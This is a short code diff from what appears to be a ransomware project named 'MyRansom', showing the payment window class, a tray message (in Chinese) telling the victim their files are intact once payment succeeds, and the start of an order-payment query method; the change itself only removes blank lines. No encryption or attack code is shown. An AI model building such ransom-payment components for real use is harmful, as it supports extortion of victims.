@@ -120,8 +120,6 @@ class Pay_window(QMainWindow, Ui_PayWindow):
         if self.tradeSucc:
             self.tray.showMessage(u"MyRansom", '歪比歪比！你的文件完好无损！', icon=1) 
 
-
-
     # 查询订单支付情况
     def query_order(self, out_trade_no, cancel_time=600):
         '''
